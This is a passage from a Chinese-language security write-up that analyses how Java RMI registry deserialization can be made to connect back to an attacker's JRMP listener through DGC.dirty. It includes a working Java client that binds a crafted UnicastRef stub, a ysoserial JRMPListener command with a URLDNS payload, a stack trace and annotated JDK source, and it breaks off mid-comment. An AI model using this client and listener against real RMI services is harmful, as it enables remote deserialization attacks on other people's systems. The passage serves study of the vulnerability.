<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>JEP 290 仅在服务端引用层（<code>UnicastServerRef</code>）的 <code>unmarshalCustomCallData</code> 方法中显式注册了过滤器。客户端引用层（<code>UnicastRef</code>）并<strong>没有设置过滤器</strong>。</p>
<h4 id="注册中心-1"><a href="#注册中心-1" class="headerlink" title="注册中心"></a>注册中心</h4><h5 id="JRMP-回连诱导（本地）"><a href="#JRMP-回连诱导（本地）" class="headerlink" title="JRMP 回连诱导（本地）"></a>JRMP 回连诱导（本地）</h5><p><code>Registry.bind(name, stub)</code> 传输的是 <strong>Stub 的序列化数据</strong>。Registry 要存它，必须把 Stub <strong>反序列化</strong> 成对象（会用到 JDK 自带的 <code>UnicastRef/LiveRef/TCPEndpoint/ObjID</code> 等类型）。当 Registry 在反序列化过程中读到 <code>LiveRef(TCPEndpoint)</code> 后，会先把这些“跨端远程引用”<strong>暂存</strong>起来；在 <strong><code>releaseInputStream()</code> 收尾</strong>时统一 **<code>registerRefs()</code>**，从而对每个端点发起 **<code>DGC.dirty</code>**（“我现在持有这些远程对象，请先别回收”）。</p>
<p>因此，只要把 <code>TCPEndpoint</code> 指向我们的 <strong>JRMPListener</strong>，Registry 就会<strong>回连</strong>到我们指定的 <code>host:port</code>。</p>
<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 不同进程分组（带背景色） ──
    box rgb(230,242,255) 攻击者客户端（进程A）
      participant A as 攻击者客户端
    end

    box rgb(232,245,233) 注册中心（进程B）
      participant R_Skel as RegistryImpl_Skel / Skeleton
      participant R_CIS as ConnectionInputStream
      participant R_DGC as DGCClient
    end

    box rgb(255,243,224) 恶意JRMPListener（进程C）
      participant L as JRMPListener
    end

    %% ── 主流程 ──
    A->>R_Skel: bind(name, stub[UnicastRef→LiveRef(TCPEndpoint)])
    R_Skel->>R_Skel: checkAccess("bind") 🔒

    alt 非本地来源（高版本） ❌
      R_Skel-->>A: AccessException 🚫
    else 本地来源 ✅
      R_Skel->>R_CIS: getInputStream()
      R_Skel->>R_CIS: in.readObject() 读取 name
      R_Skel->>R_CIS: in.readObject() 读取 Remote(Stub) 📥
      note right of R_CIS: RemoteObject.readObject → UnicastRef.readExternal →<br/>LiveRef.read(...) → saveRef(liveRef) 📦

      opt JEP 290 过滤 🛡️
        R_CIS->>R_CIS: 类名/深度/数组/引用数检查
        alt 过滤拒绝 ❌
          R_Skel-->>A: InvalidClassException / UnmarshalException 🚫
        else 通过 ✅
          note right of R_CIS: 继续收集 LiveRef 📦
        end
      end

      R_Skel-->>R_CIS: finally: releaseInputStream() 🧹
      note right of R_CIS: 收尾 → registerRefs() 🔁（按 Endpoint 合批）

      R_CIS->>R_DGC: registerRefs(endpoint, [liveRef...]) 📦
      R_DGC->>L: JRMP 调用 DGC.dirty(ObjID[], Lease请求) 🌐

      alt 正常返回（NormalReturn） ✅
        L-->>R_DGC: 返回 Lease 📄
        R_DGC->>R_DGC: 设置 leaseFilter（JDK 8u231+）🛡️
        R_DGC->>R_DGC: readObject() 读取 Lease
        alt 白名单允许 ✅
          R_DGC-->>R_Skel: 续租成功 ✅
        else 白名单拒绝 ❌
          R_DGC-->>R_Skel: InvalidClassException → UnmarshalException 🚫
        end

      else 异常返回（ExceptionalReturn） ⚠️
        L-->>R_DGC: 返回异常对象 💥
        note over R_DGC: StreamRemoteCall.executeCall 内<br/>先反序列化异常（可能早于 leaseFilter）🕳️ → 潜在触发链 🧨<br/>随后抛 UnexpectedException 属预期
      end
    end</pre>

<p>例如服务端创建一个注册中心：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 本地启动一个 RMI 注册中心（Registry），监听 1099 端口。</span></span><br><span class="line"><span class="comment"> * 仅用于演示/本地联调。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] RMI Registry started on 127.0.0.1:1099&quot;</span>);</span><br><span class="line">        <span class="comment">// 保持存活</span></span><br><span class="line">        Thread.sleep(Long.MAX_VALUE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后客户端想注册中心 bind 一个 Remote 代理对象，该 Stub 内部持有 UnicastRef，指向指定的 JRMP 端点（host:port）。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ↓↓↓ 以下为 JDK 内部 API，JDK 9+ 需 --add-exports</span></span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 向本地注册中心 bind 一个 Remote 代理对象（Stub）。</span></span><br><span class="line"><span class="comment"> * 该 Stub 内部持有 UnicastRef，指向指定的 JRMP 端点（host:port）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 绑定发生时，注册中心需要反序列化该 Stub（涉及 UnicastRef/LiveRef/TCPEndpoint）。</span></span><br><span class="line"><span class="comment"> * 在旧版本/默认未配置过滤器场景下，可用于触发一系列副作用（如 DGC dirty → 连接恶意 JRMP 服务端等）。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 1) 连接本机注册中心</span></span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 构造指向“恶意 JRMP 服务端”的远程引用（UnicastRef）</span></span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt());           <span class="comment">// 远程对象 ID</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">12233</span>);   <span class="comment">// JRMPListener 所在主机与端口</span></span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 用 UnicastRef 包装成 RMI 动态代理的调用处理器</span></span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 生成 Remote 动态代理（最小接口集合：仅 Remote.class）</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">proxy</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(</span><br><span class="line">                RMIClient.class.getClassLoader(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Remote.class &#125;,</span><br><span class="line">                handler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5) 绑定到注册中心（注册名 &quot;x&quot;）</span></span><br><span class="line">        <span class="comment">//    高版本中，Registry 对 bind/rebind/unbind 有“来源 IP 必须为本机”的校验；</span></span><br><span class="line">        <span class="comment">//    我们使用 127.0.0.1 发起，可通过本地校验。</span></span><br><span class="line">        registry.bind(<span class="string">&quot;x&quot;</span>, proxy);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;[*] Bind done: name=&#x27;x&#x27; → UnicastRef(&quot;</span> + te.getHost() + <span class="string">&quot;:&quot;</span> + te.getPort() + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>绑定发生时，注册中心需要反序列化该 Stub（涉及 UnicastRef&#x2F;LiveRef&#x2F;TCPEndpoint）导致 DGC dirty → 连接恶意 JRMP 服务端。</p>
<p>此时如果我们设置 <code>ysoserial.exploit.JRMPListener</code> 监听该端口则会在 DGC dirty 触发反序列化。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-all.jar ysoserial.exploit.JRMPListener 12233 URLDNS http://example.com</span><br></pre></td></tr></table></figure></div>

<p>这里以 <code>bind</code> 为例，在前面针对构造指向“恶意 JRMP 服务端”的远程引用（UnicastRef）的反序列化的过程中有如下调用栈：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">at sun.rmi.transport.ConnectionInputStream.saveRef(ConnectionInputStream.java:70)</span><br><span class="line">at sun.rmi.transport.LiveRef.read(LiveRef.java:305)</span><br><span class="line">at sun.rmi.server.UnicastRef.readExternal(UnicastRef.java:489)</span><br><span class="line">at java.rmi.server.RemoteObject.readObject(RemoteObject.java:454)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-1)</span><br><span class="line">at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)</span><br><span class="line">at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:564)</span><br><span class="line">at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1160)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2207)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:2346)</span><br><span class="line">at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2240)</span><br><span class="line">at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2078)</span><br><span class="line">at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1585)</span><br><span class="line">at java.io.ObjectInputStream.readObject(ObjectInputStream.java:422)</span><br><span class="line">at sun.rmi.registry.RegistryImpl_Skel.dispatch(RegistryImpl_Skel.java:109)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:467)</span><br><span class="line">at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:297)</span><br><span class="line">at sun.rmi.transport.Transport$1.run(Transport.java:200)</span><br><span class="line">at sun.rmi.transport.Transport$1.run(Transport.java:197)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at sun.rmi.transport.Transport.serviceCall(Transport.java:196)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:567)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:800)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.lambda$run$0(TCPTransport.java:682)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$36.2071178362.run(Unknown Source:-1)</span><br><span class="line">at java.security.AccessController.doPrivileged(AccessController.java:-1)</span><br><span class="line">at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)</span><br><span class="line">at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)</span><br><span class="line">at java.lang.Thread.run(Thread.java:844)</span><br></pre></td></tr></table></figure></div>

<p><code>RemoteObject#readObject</code> 实现代码如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 自定义反序列化（custom serialization）的 &#123;<span class="doctag">@code</span> readObject&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;本方法按如下步骤读取并还原当前对象中 &#123;<span class="doctag">@code</span> ref&#125; 字段（类型为 &#123;<span class="doctag">@link</span> RemoteRef&#125;）：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;ol&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;先在输入流 &#123;<span class="doctag">@code</span> in&#125; 上调用 &#123;<span class="doctag">@link</span> java.io.ObjectInputStream#readUTF readUTF()&#125;</span></span><br><span class="line"><span class="comment"> *       读取“外部引用类型名”（external ref type name）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;若读取到的字符串长度为 0（或为 &#123;<span class="doctag">@code</span> null&#125;）：</span></span><br><span class="line"><span class="comment"> *       &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;说明没有显式的引用类型名；直接在 &#123;<span class="doctag">@code</span> in&#125; 上调用 &#123;<span class="doctag">@link</span> java.io.ObjectInputStream#readObject readObject()&#125;，</span></span><br><span class="line"><span class="comment"> *             将其结果强制转换为 &#123;<span class="doctag">@code</span> RemoteRef&#125;，并赋给当前对象的 &#123;<span class="doctag">@code</span> ref&#125; 字段。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;否则（读到了内建/实现相关的引用类型名）：</span></span><br><span class="line"><span class="comment"> *       &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;将类型名拼接为内部实现类的全名：&#123;<span class="doctag">@code</span> RemoteRef.packagePrefix + &quot;.&quot; + refClassName&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;通过 &#123;<span class="doctag">@link</span> Class#forName(String)&#125; 加载该类，并用（过时但为兼容保留的）&#123;<span class="doctag">@code</span> newInstance()&#125; 实例化。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;将实例强转为 &#123;<span class="doctag">@code</span> RemoteRef&#125; 并赋给 &#123;<span class="doctag">@code</span> ref&#125; 字段；随后调用 &#123;<span class="doctag">@code</span> ref.readExternal(in)&#125;</span></span><br><span class="line"><span class="comment"> *             让该引用对象按其“外部形式”（external form）从流中继续读取自身字段。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *         &lt;li&gt;如果加载/实例化/类型转换失败，则抛出 &#123;<span class="doctag">@link</span> ClassNotFoundException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *       &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ol&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;内建的“外部引用类型名”通常包括：</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> &quot;UnicastRef&quot;&#125;, &#123;<span class="doctag">@code</span> &quot;UnicastServerRef&quot;&#125;, &#123;<span class="doctag">@code</span> &quot;UnicastRef2&quot;&#125;,</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> &quot;UnicastServerRef2&quot;&#125;, &#123;<span class="doctag">@code</span> &quot;ActivatableRef&quot;&#125; 等。</span></span><br><span class="line"><span class="comment"> * 若读到其他非空字符串且实现未提供对应类，则会抛出 &#123;<span class="doctag">@code</span> ClassNotFoundException&#125;。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, java.lang.ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取“外部引用类型名”（可能为空串，表示未指定）</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">refClassName</span> <span class="operator">=</span> in.readUTF();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (refClassName == <span class="literal">null</span> || refClassName.length() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 情况一：未指定引用类名</span></span><br><span class="line"><span class="comment">         * 直接把下一段序列化数据反序列化为 RemoteRef，并赋值给 ref。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ref = (RemoteRef) in.readObject();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 情况二：指定了内建/实现相关的引用类名</span></span><br><span class="line"><span class="comment">         * 计算内部实现类名并加载，然后让该 RemoteRef 自己以 external form 的方式读入字段。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">internalRefClassName</span> <span class="operator">=</span> RemoteRef.packagePrefix + <span class="string">&quot;.&quot;</span> + refClassName;</span><br><span class="line">        Class&lt;?&gt; refClass = Class.forName(internalRefClassName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;deprecation&quot;)</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">tmp</span> <span class="operator">=</span> refClass.newInstance(); <span class="comment">// JDK9 起已废弃，用于兼容的旧用法</span></span><br><span class="line">            ref = (RemoteRef) tmp;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException | IllegalAccessException | ClassCastException e) &#123;</span><br><span class="line">            <span class="comment">// 找到了类但不是一个可序列化/期望的 RemoteRef 实现，按“类不存在”处理</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ClassNotFoundException</span>(internalRefClassName, e);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 由具体的 RemoteRef 实现按其“外部形式”从流中读取自身字段</span></span><br><span class="line">        ref.readExternal(in); <span class="comment">// 📌</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它在<strong>反序列化一个远程对象的“引用 ref”</strong>。流里先写了个<strong>类型标记</strong>（比如 <code>&quot;UnicastRef&quot;</code>），读出来后：</p>
<ul>
<li>如果<strong>没写类型标记</strong>，就用常规 <code>readObject()</code> 把整个 <code>RemoteRef</code> 读回来；</li>
<li>如果<strong>写了类型标记</strong>，就<strong>new 出对应的 RemoteRef 类</strong>（如 <code>sun.rmi.server.UnicastRef</code>），然后<strong>让它自己按“外部格式”把字段从流里读出来</strong>——这就发生在 <code>ref.readExternal(in)</code> 这句。</li>
</ul>
<p><code>readExternal</code> 会调用到 <code>LiveRef</code> 的 <code>read</code> 方法。该方法会：</p>
<ul>
<li>从数据流中读取端点（Endpoint）和远程对象标识（<code>ObjID</code>）；</li>
<li>基于端点与对象ID构造 <code>LiveRef</code>，并调用 <code>ConnectionInputStream#saveRef</code> 将本次读取到的 LiveRef 暂存到流内。</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取 RemoteRef 的“外部表示”（external form），并恢复为内部引用。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;说明：</span></span><br><span class="line"><span class="comment"> * 该实现仅将具体的读取逻辑委托给 &#123;<span class="doctag">@link</span> LiveRef#read(ObjectInput, boolean)&#125;，</span></span><br><span class="line"><span class="comment"> * 这里传入 &#123;<span class="doctag">@code</span> false&#125; 表示使用“旧版主机/端口编码格式”（JDK 1.1 风格）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in  输入流（反序列化来源）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 若反序列化到的类在当前环境中不可用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException            读流过程中发生 I/O 错误</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">readExternal</span><span class="params">(ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 从输入流恢复 LiveRef；useNewFormat=false ⇒ 使用旧格式读取端点信息</span></span><br><span class="line">    ref = LiveRef.read(in, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 从输入流中读取并构造一个 LiveRef。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;读取顺序为：</span></span><br><span class="line"><span class="comment"> * 1) 端点（Endpoint/TCPEndpoint），支持“新格式”或“JDK1.1 旧格式”；</span></span><br><span class="line"><span class="comment"> * 2) 远程对象标识（ObjID）；</span></span><br><span class="line"><span class="comment"> * 3) 布尔标志 isResultStream（标识该流是否为“返回值流”）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;副作用：</span></span><br><span class="line"><span class="comment"> * - 如果输入流是 &#123;<span class="doctag">@link</span> ConnectionInputStream&#125;，则：</span></span><br><span class="line"><span class="comment"> *   · 将本次读取到的 LiveRef 暂存到流的 incomingRefTable，</span></span><br><span class="line"><span class="comment"> *     由其在参数/返回值全部解组完成后统一调用 DGCClient.registerRefs</span></span><br><span class="line"><span class="comment"> *     （即批量发送一次 DGC 的 dirty 调用）；</span></span><br><span class="line"><span class="comment"> *   · 若 isResultStream 为 true，则标记需要发送 DGC “ack” 确认。</span></span><br><span class="line"><span class="comment"> * - 若输入流不是 ConnectionInputStream（少见情况），则立即调用</span></span><br><span class="line"><span class="comment"> *   &#123;<span class="doctag">@link</span> DGCClient#registerRefs&#125; 针对该端点注册引用（触发 DGC.dirty）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> in            输入流</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> useNewFormat  是否使用“新格式”读取端点：</span></span><br><span class="line"><span class="comment"> *                      true  ⇒ 使用 